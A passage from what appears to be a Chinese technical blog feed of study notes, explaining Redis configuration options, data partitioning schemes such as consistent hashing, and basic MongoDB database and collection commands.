是否启动成功。比如系统启动时，需要先启动 Redis，再启动依赖它的应用，但操作系统不知道 Redis 什么时候真正可用，可能会提前启动依赖服务，导致运行错误</span><br><span class="hljs-string">2. 这和进程本身无关，仅仅是告诉操作系统 “我准备好了” 与否。无论是否汇报，只要 Redis 启动了，你都能找到它的进程 ID，并通过该 PID kill 进程</span><br><span class="hljs-string">3. no（默认）：</span><br><span class="hljs-string">1. 不启用任何服务管理器的交互，不汇报状态</span><br><span class="hljs-string">4. upstart：</span><br><span class="hljs-string">1. 适配 Upstart 服务管理系统</span><br><span class="hljs-string">5. systemd：</span><br><span class="hljs-string">1. 适配 systemd 服务管理系统</span><br><span class="hljs-string">6. auto：</span><br><span class="hljs-string">1. 自动检测当前环境变量（如通过 UPSTART_JOB 或 NOTIFY_SOCKET 判断），自动选择合适的 supervision 方法。</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>pidfile<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. Redis 启动后，除了由操作系统分配进程号（PID），还会将该 PID 写入配置指定的 pidfile 文件中，主要用于后续进程管理和关闭操作。</span><br><span class="hljs-string">2. 需要注意，即使不写入 pidfile，Redis 进程本身依然会正常启动和运行，你仍然可以通过 ps aux | grep redis 等方式查到它。pidfile 的意义在于：当我们编写 shell 脚本来启动或停止 Redis 时，通常通过 cat redis.pid 获取 PID 后执行 kill 命令；或者在一台服务器上同时运行多个 Redis 实例时，通过不同的 pidfile 区分各自的进程。</span><br><span class="hljs-string">3. 另外，不需要提前手动创建 pid 文件，Redis 会在启动过程中自动生成该文件，只要确保其所在目录存在并具有写权限即可。</span><br><span class="hljs-string">4. /var/run/redis_6379.pid（默认）：</span><br><span class="hljs-string">1. 默认路径</span><br><span class="hljs-string">5. 其他 路径：</span><br><span class="hljs-string">1. 如 /mystudy/redis/pid/redis.pid</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>loglevel<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 指定日志等级</span><br><span class="hljs-string">2. debug：</span><br><span class="hljs-string">1. 最详细的级别，适合调试</span><br><span class="hljs-string">3. verbose：</span><br><span class="hljs-string">4. notice：</span><br><span class="hljs-string">1. 输出适度的重要消息，推荐用于生产环境</span><br><span class="hljs-string">5. warning：</span><br><span class="hljs-string">1. 只记录关键或严重问题</span><br><span class="hljs-string">6. nothing：</span><br><span class="hljs-string">1. 不记录任何日志（几乎没人用，除非你追求极致的性能或又其他监控机制）</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>logfile<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 指定日志文件的位置</span><br><span class="hljs-string">2. &quot;&quot;（默认）：</span><br><span class="hljs-string">1. 代表日志输出到标准输出</span><br><span class="hljs-string">3. 其他 路劲：</span><br><span class="hljs-string">1. 例如 /mystudy/redis/logs/redis.log</span><br><span class="hljs-string">4. 我们可以指定其他路径，如果你启用了 daemonize yes，而又没有指定日志文件，日志会被丢弃到 /dev/null。</span><br><span class="hljs-string">1. daemonize 和我们的日志有什么关系？</span><br><span class="hljs-string">2. 服务前台运行时，stdout 是终端，可以看到日志</span><br><span class="hljs-string">3. 服务后台运行时，stdout 被重定向到 /dev/null，除非我们设置了 loglevel</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>syslog-enabled<br><br><br>syslog-ident<br><br><br>syslog-facility<br><br><br>crash-log-enabled<br><br><br>crash-memcheck-enabled<br><br><br>databases<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 数据库的数量</span><br><span class="hljs-string">2. 可选值：</span><br><span class="hljs-string">1. 16（默认）：</span><br><span class="hljs-string">1. Redis 默认 16 个数据库</span><br><span class="hljs-string">2. 其他 数值：</span><br><span class="hljs-string">1. 例如 8</span><br><span class="hljs-string">3. 注意事项：</span><br><span class="hljs-string">1. 虽然 Redis 提供了多个逻辑库，但很多实际项目中只使用 DB 0</span><br><span class="hljs-string">2. 在使用 Redis Cluster 时，也只能使用 DB 0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>always-show-logo<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 是否在 Redis 启动时，显示 ASCII 艺术字 logo</span><br><span class="hljs-string">2. 可选值：</span><br><span class="hljs-string">1. yes</span><br><span class="hljs-string">2. no</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>hide-user-data-<span class="hljs-keyword">from</span>-log<br><br><br><span class="hljs-built_in">set</span>-proc-title<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 是否修改 Redis 进程名，以便在系统工具如 top、ps aux 中显示更丰富的运行时信息，方便管理员快速了解进程状态</span><br><span class="hljs-string">2. 可选值：</span><br><span class="hljs-string">1. yes（默认）：</span><br><span class="hljs-string">1. Redis 会修改当前进程的标题（进程名），具体能修改成什么，看下面 proc-title-template</span><br><span class="hljs-string">2. no：</span><br><span class="hljs-string">1. Redis 进程名保持为启动时的原始名称，不显示附加的运行时状态信息</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>proc-title-template<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 设置进程标题的模板</span><br><span class="hljs-string">2. 可选值：</span><br><span class="hljs-string">1. &#123;title&#125; &#123;listen-addr&#125; &#123;server-mode&#125;（默认）：</span><br><span class="hljs-string">1. 默认模板</span><br><span class="hljs-string">3. 候选值：</span><br><span class="hljs-string">1. &#123;title&#125;：</span><br><span class="hljs-string">1. 进程名称，如果是主进程就是执行命令名，子进程则显示子进程类型</span><br><span class="hljs-string">2. &#123;listen-addr&#125;：</span><br><span class="hljs-string">1. 监听的地址</span><br><span class="hljs-string">3. &#123;server-mode&#125;：</span><br><span class="hljs-string">1. 服务器特殊模式，比如 [sentinel] 表示哨兵模式，[cluster] 表示集群模式</span><br><span class="hljs-string">4. &#123;port&#125;：</span><br><span class="hljs-string">1. TCP 监听端口，若未开启则为 0</span><br><span class="hljs-string">5. &#123;tls-port&#125;：</span><br><span class="hljs-string">1. TLS 监听端口，若未开启则为 0</span><br><span class="hljs-string">6. &#123;unixsocket&#125;：</span><br><span class="hljs-string">1. Unix 域套接字路径，未使用则为空字符串。</span><br><span class="hljs-string">7. &#123;config-file&#125;：</span><br><span class="hljs-string">1. Redis 使用的配置文件名称</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>locale-collate<br><br></code></pre></td></tr></table></figure><hr><h3 id="1-2-RDB-配置（SNAPSHOTTING）"><a href="#1-2-RDB-配置（SNAPSHOTTING）" class="headerlink" title="1.2. RDB 配置（SNAPSHOTTING）"></a>1.2. RDB 配置（SNAPSHOTTING）</h3><figure class="highlight pony"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs pony">save <span class="hljs-number">3600</span> <span class="hljs-number">1</span> <span class="hljs-number">300</span> <span class="hljs-number">100</span> <span class="hljs-number">60</span> <span class="hljs-number">10000</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 3600 秒内（1小时）有 ≥ 1 次写操作，进入 RDB 快照保存</span><br><span class="hljs-string">2. 300 秒内（5分钟）有 ≥ 100 次写操作，进入 RDB 快照保存</span><br><span class="hljs-string">3. 60 秒内有 ≥ 10000 次写操作，进入 RDB 快照保存</span><br><span class="hljs-string">4. 可以写成 save &quot;&quot; 表示禁用 RDB 快照保存</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>stop-writes-on-bgsave-<span class="hljs-keyword">error</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 是否当 Redis 在后台保存快照失败时停止接受写操作，目的是：强行提醒你 “写入的数据没有成功持久化”，别以为还很安全</span><br><span class="hljs-string">2. 可选值：</span><br><span class="hljs-string">1. yes（默认）</span><br><span class="hljs-string">2. no：</span><br><span class="hljs-string">1. 如果你已经有很完善的监控，也可以改成 no</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>rdbcompression<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 是否在保存 .rdb 文件时会使用 LZF 算法压缩字符串对象</span><br><span class="hljs-string">2. 可选值：</span><br><span class="hljs-string">1. yes（默认）：</span><br><span class="hljs-string">1. 能够节省磁盘空间，代价是保存过程稍微多耗些 CPU</span><br><span class="hljs-string">2. no：</span><br><span class="hljs-string">1. 更省 CPU，尤其适合 CPU 紧张的环境，但文件会变大</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>rdbchecksum<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 是否在 RDB 文件末尾添加一个 CRC64 校验和</span><br><span class="hljs-string">2. 可选值：</span><br><span class="hljs-string">1. yes（默认）：</span><br><span class="hljs-string">1. 能够提高文件的可靠性，防止损坏导致读取出错</span><br><span class="hljs-string">2. no：</span><br><span class="hljs-string">1. 节省一点性能（10% 左右），但读取时不会校验是否损坏</span><br><span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">sanitize-dump-payload</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><span class="hljs-number">1.</span> 控制 <span class="hljs-type">Redis</span> 在加载 <span class="hljs-type">RDB</span> 文件或执行 <span class="hljs-type">RESTORE</span> 命令时，是否对压缩结构（如 ziplist、listpack）做完整性检查，防止出现不一致或崩溃。<br><span class="hljs-number">2.</span> 可选值：<br><span class="hljs-number">1.</span> clients（默认）：<br><span class="hljs-number">1.</span> 只对客户端连接恢复的数据检查，推荐使用<br><span class="hljs-number">2.</span> yes：<br><span class="hljs-number">1.</span> 总是检查，最安全<br><span class="hljs-number">3.</span> no：<br><span class="hljs-number">1.</span> 不检查，性能最高，但风险高<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">dbfilename</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-number">1.</span> 保存快照的文件名<br><span class="hljs-number">2.</span> 可选值：<br><span class="hljs-number">1.</span> dump.rdb（默认）<br><span class="hljs-number">2.</span> 其他 文件名<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">rdb-del-sync-files</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-number">1.</span> 当 <span class="hljs-type">Redis</span> 实例既没有开启 <span class="hljs-type">RDB</span>，也没有开启 <span class="hljs-type">AOF</span> 时，是否要删除用于主从同步的临时 <span class="hljs-type">RDB</span> 文件<br><span class="hljs-number">2.</span> 可选值：<br><span class="hljs-number">1.</span> yes：<br><span class="hljs-number">1.</span> 删除在主从同步过程中创建的 <span class="hljs-type">RDB</span> 文件（就是我作为主节点，生成的用于发送给从节点并供其加载的那个 <span class="hljs-type">RDB</span> 文件）<br><span class="hljs-number">2.</span> no（默认）：<br><span class="hljs-number">1.</span> <span class="hljs-type">RDB</span> 同步文件保留在磁盘<br><span class="hljs-number">3.</span> 注意事项：<br><span class="hljs-number">1.</span> 你可能会好奇，既然我没有开启持久化，为什么主从同步还能正常进行？其实，主从同步的核心是数据复制，这个过程并不依赖于持久化文件，而是基于内存中的数据快照来传输。<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">dir </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-number">1.</span> 保存 dump.rdb（和 <span class="hljs-type">AOF</span> 文件）的工作目录（工作目录，不包含文件名）<br><span class="hljs-number">2.</span> 可选值：<br><span class="hljs-number">1.</span> ./（默认）：<br><span class="hljs-number">1.</span> 即当前目录<br><span class="hljs-number">2.</span> 注意不是配置文件 redis.conf 所在的目录，而是指你启动 <span class="hljs-type">Redis</span> 服务器时所在的那个目录<br><span class="hljs-number">2.</span> 其他 目录：<br><span class="hljs-number">1.</span> 例如 /mystudy/redis/data<br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="主从复制配置（REPLICATION）"><a href="#主从复制配置（REPLICATION）" class="headerlink" title="主从复制配置（REPLICATION）"></a>主从复制配置（REPLICATION）</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs awk">replicaof<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 设置 当前 Redis 实例 为某个主节点的副本（从节点）</span><br><span class="hljs-string">2. 可选值：</span><br><span class="hljs-string">1. 具体 IP 和 端口：</span><br><span class="hljs-string">1. 例如 replicaof 192.168.1.10 6379</span><br><span class="hljs-string">3. 注意事项， </span><br><span class="hljs-string">1. 只适用于传统的主从集群，Redis Cluster 集群下，Redis会忽略掉 replicaof 指令，因为 Redis Cluster 会维护自己的节点信息表（nodes.conf），主从关系记录在这里，而不是来自 replicaof 的配置。</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>masteruser<br>masterauth<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. ACL 的用户名和密码</span><br><span class="hljs-string">2. 注意事项：</span><br><span class="hljs-string">1. 这是基于 ACL 的，在 Redis 6 之前，只需要写 masterauth ，里面写主节点的密码即可</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>replica-serve-stale-data<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 是否当副本即使与主节点失联了，也继续响应客户端的读请求</span><br><span class="hljs-string">2. 可选值：</span><br><span class="hljs-string">1. yes（默认）：</span><br><span class="hljs-string">1. 可能会返回旧数据</span><br><span class="hljs-string">2. no：</span><br><span class="hljs-string">1. 会拒绝大多数数据访问命令，只允许执行部分命令（如 INFO、REPLICAOF、AUTH、CONFIG 等管理命令）</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br>replica-read-only<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 副本是否是只读的（读写分离）</span><br><span class="hljs-string">2. 可选值：</span><br><span class="hljs-string">1. yes（默认）：</span><br><span class="hljs-string">1. 读写分离</span><br><span class="hljs-string">2. no</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><br><br></code></pre></td></tr></table></figure><h3 id="安全配置"><a href="#安全配置" class="headerlink" title="安全配置"></a>安全配置</h3><h2 id="2-常见分区方案"><a href="#2-常见分区方案" class="headerlink" title="2. 常见分区方案"></a>2. 常见分区方案</h2><p>哈西分区、一致性哈希分区、节点取余分区</p><table><thead><tr><th>分区方式</th><th>适用场景</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>范围分区</td><td>按时间、数字范围查询多</td><td>查询区间快</td><td>数据分布可能不均</td></tr><tr><td>列表分区</td><td>离散字段（国家、类型）</td><td>灵活</td><td>维护复杂，数据倾斜</td></tr><tr><td>哈希分区</td><td>数据均匀分布</td><td>负载均衡好</td><td>不适合范围查询</td></tr><tr><td>复合分区</td><td>复杂查询和负载均衡要求</td><td>灵活兼顾</td><td>复杂难管理</td></tr><tr><td>键值分区</td><td>Redis、分布式缓存</td><td>自动透明</td><td>受限于哈希算法</td></tr></tbody></table><h3 id="2-1-节点取余分区"><a href="#2-1-节点取余分区" class="headerlink" title="2.1. 节点取余分区"></a>2.1. 节点取余分区</h3><p>直接对某个字段（如用户ID）的数值进行取余运算（mod），根据节点总数确定数据存放的位置。举例来说，4个节点时，用户ID为12345，则计算：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">12345 </span>% <span class="hljs-number">4</span> = <span class="hljs-number">1</span>  → 数据落在节点 <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>该方法实现简单，定位快速，只需知道节点数量和 key 即可完成映射。数据在节点间分布较均匀，有效避免热点节点。</p><p>但其缺点也较明显：一旦节点数发生变化（如从4扩容到5），几乎所有 key 的映射结果都会改变，导致大量数据迁移。此外，均匀分布虽好，但会导致连续范围的数据被分散到不同节点，降低范围查询效率。</p><hr><h3 id="2-2-哈希分区"><a href="#2-2-哈希分区" class="headerlink" title="2.2. 哈希分区"></a>2.2. 哈希分区</h3><p>与节点取余分区类似，但不同之处在于，先对 key 进行哈希，无论 key 是数字还是字符串，都能统一处理。示例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hash</span>(<span class="hljs-string">&quot;user:123&quot;</span>) % <span class="hljs-number">3</span> = <span class="hljs-number">1</span>  → 数据落在节点 <span class="hljs-number">1</span>（key 是 user:<span class="hljs-number">123</span>）<br><span class="hljs-attribute">hash</span>(<span class="hljs-string">&quot;user:456&quot;</span>) % <span class="hljs-number">3</span> = <span class="hljs-number">0</span>  → 数据落在节点 <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>此方式简单高效，如果哈希函数的质量很高，可以实现良好的数据均匀分布。缺点与节点取余分区相同，即节点数变化时大规模数据重映射，以及范围查询效率受限。</p><hr><h3 id="2-3-一致性哈希分区"><a href="#2-3-一致性哈希分区" class="headerlink" title="2.3. 一致性哈希分区"></a>2.3. 一致性哈希分区</h3><p>把 key 和节点都映射到一个“虚拟哈希环”上，哈希空间范围从 0 到 2³²-1。每个 key 会被分配到它在环上顺时针遇到的第一个节点上。下面是一个典型的哈希环示意，key1 对应到 Node1：</p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ARedis%20%E5%9F%BA%E7%A1%80/image-20250530160330698.png"></p><p>这种设计的好处是，当你增加或减少节点时，只有少量的 key 需要重新分配，避免了大量数据迁移的问题。不过需要注意的是，节点的位置也是通过哈希算出来的，分布不一定均匀，可能会导致某些节点压力比较大。比如，添加一个节点后，节点的分布可能像这样：</p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ARedis%20%E5%9F%BA%E7%A1%80/image-20250530160555827.png"></p><hr><h3 id="2-4-虚拟一致性哈希分区"><a href="#2-4-虚拟一致性哈希分区" class="headerlink" title="2.4. 虚拟一致性哈希分区"></a>2.4. 虚拟一致性哈希分区</h3><p>因为传统一致性哈希会出现有些节点“管得多”，有些“管得少”的情况，导致负载不平衡，所以引入了“虚拟节点”这个技巧。简单来说，就是给每个物理节点分配多个虚拟节点，让它们均匀分布在哈希环上，确保负载更平均。</p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ARedis%20%E5%9F%BA%E7%A1%80/image-20250530161002181.png"></p><hr><h2 id="文件结构树"><a href="#文件结构树" class="headerlink" title="文件结构树"></a>文件结构树</h2><p>使用 Alt + 数字键：</p><ol><li>├：Alt + 195</li><li>─：Alt + 196</li><li>└：Alt + 192</li></ol>]]></content>
    
    
    <categories>
      
      <category>数据管理</category>
      
      <category>非关系型数据库</category>
      
      <category>键值型</category>
      
      <category>Redis</category>
      
      <category>Redis 基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Mall 商城</title>
    <link href="/2025/05/16/%E7%AC%94%E8%AE%B0%EF%BC%9AMall%20%E5%95%86%E5%9F%8E/"/>
    <url>/2025/05/16/%E7%AC%94%E8%AE%B0%EF%BC%9AMall%20%E5%95%86%E5%9F%8E/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
      <category>Mall 商城</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：MongoDB 基础</title>
    <link href="/2025/05/16/%E7%AC%94%E8%AE%B0%EF%BC%9AMongoDB%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/05/16/%E7%AC%94%E8%AE%B0%EF%BC%9AMongoDB%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h3 id="MongoDB-语法"><a href="#MongoDB-语法" class="headerlink" title="MongoDB 语法"></a>MongoDB 语法</h3><h4 id="库操作"><a href="#库操作" class="headerlink" title="库操作"></a>库操作</h4><p>&#x3D;&#x3D;1.创建数据库&#x3D;&#x3D;</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># 1. 如果数据库不存在，则创建数据库，否则切换到指定数据库。</span><br><span class="hljs-keyword">use</span> &lt;repository-name&gt;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>MongoDB 很“懒”，它不像 MySQL 那样执行 <code>CREATE DATABASE</code> 后立刻就把文件写好。</li><li>如果你用 <code>use runoob</code> 切换了数据库，它并不会立即创建这个数据库，只有你真正<strong>往这个数据库的集合里插入了数据</strong>，MongoDB 才会真的在磁盘上“认认真真”把数据库搞出来；</li><li>所以这就是我们使用 <code>show dbs</code> 查不出来的原因，我们可以先创建集合，插入一些数据</li></ol></blockquote><p>&#x3D;&#x3D;2.删除数据库&#x3D;&#x3D;</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># 1. 切换到要删除数据库</span><br><span class="hljs-keyword">use</span> myDatabase<br><br><br><span class="hljs-comment"># 2. 删除数据库</span><br>db.dropDatabase()<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.修改数据库&#x3D;&#x3D;</p><p>&#x3D;&#x3D;4.查询数据库&#x3D;&#x3D;</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-meta"># 1. 查询所有数据库</span><br><span class="hljs-keyword">show</span> dbs<br><br><br><span class="hljs-meta"># 2. 查看当前使用的数据库</span><br>db<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.使用数据库&#x3D;&#x3D;</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># 1. 如果数据库不存在，则创建数据库，否则切换到指定数据库。</span><br><span class="hljs-keyword">use</span> &lt;repository-name&gt;<br></code></pre></td></tr></table></figure><hr><h4 id="集合操作"><a href="#集合操作" class="headerlink" title="集合操作"></a>集合操作</h4><h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>我们对集合进行任何操作之前，都要先用 <code>use 库名</code> 指定数据库，否则就会默认使用 <code>test</code> 数据库</p><hr><h5 id="创建集合（☆）"><a href="#创建集合（☆）" class="headerlink" title="创建集合（☆）"></a>创建集合（☆）</h5><h6 id="创建集合模版"><a href="#创建集合模版" class="headerlink" title="创建集合模版"></a>创建集合模版</h6><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs d"># <span class="hljs-number">1.</span> 使用指定数据库（如果未使用 use 命令切换到其他数据库，则会默认使用 test 数据库）<br>use myDatabase<br><br><br># <span class="hljs-number">2.</span> 创建集合（db 代表当前使用的数据库）<br>db.createCollection(<span class="hljs-string">&quot;&lt;collection-name&gt;&quot;</span>, &#123;&lt;options&gt;&#125;)<br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. options：</span><br><span class="hljs-string">1. capped：</span><br><span class="hljs-string">    1. 是否创建一个固定大小的集合。</span><br><span class="hljs-string">    2. 示例值：capped: true</span><br><span class="hljs-string">2. size：</span><br><span class="hljs-string">    1. 集合的最大大小（以字节为单位，仅在 capped 为 true 时有效）</span><br><span class="hljs-string">    2. 示例值：size: 10485760（10MB）</span><br><span class="hljs-string">3. max：</span><br><span class="hljs-string">    1. 集合中允许的最大文档数（仅在 capped 为 true 时有效）</span><br><span class="hljs-string">    2. 示例值：max: 5000 </span><br><span class="hljs-string">4. validator：</span><br><span class="hljs-string">    1. 用于文档验证的表达式，阻止不符合要求的数据插入或更新我们的文档。</span><br><span class="hljs-string">    2. 示例值：见下文</span><br><span class="hljs-string">5. validationLevel：</span><br><span class="hljs-string">    1. 指定文档验证的严格程度。</span><br><span class="hljs-string">    2. 示例值：validationLevel: &quot;</span>strict<span class="hljs-string">&quot;</span><br><span class="hljs-string">    1. &quot;</span>off<span class="hljs-string">&quot;：不进行验证；</span><br><span class="hljs-string">    2. &quot;</span>strict<span class="hljs-string">&quot;（默认）：插入和更新操作都必须通过验证；</span><br><span class="hljs-string">    3. &quot;</span>moderate<span class="hljs-string">&quot;：仅更新现有文档时验证，插入新文档不验证。</span><br><span class="hljs-string">6. validationAction：</span><br><span class="hljs-string">    1. 指定文档验证失败时的操作。</span><br><span class="hljs-string">    2. 示例值：validationAction: &quot;</span>erro<span class="hljs-string">r&quot;</span><br><span class="hljs-string">    1. &quot;</span>erro<span class="hljs-string">r&quot;（默认）：阻止插入或更新；</span><br><span class="hljs-string">    2. &quot;w</span>arn<span class="hljs-string">&quot;：允许插入或更新，但会发出警告。</span><br><span class="hljs-string">7. storageEngine：</span><br><span class="hljs-string">    1. 为集合指定存储引擎配置。</span><br><span class="hljs-string">    2. 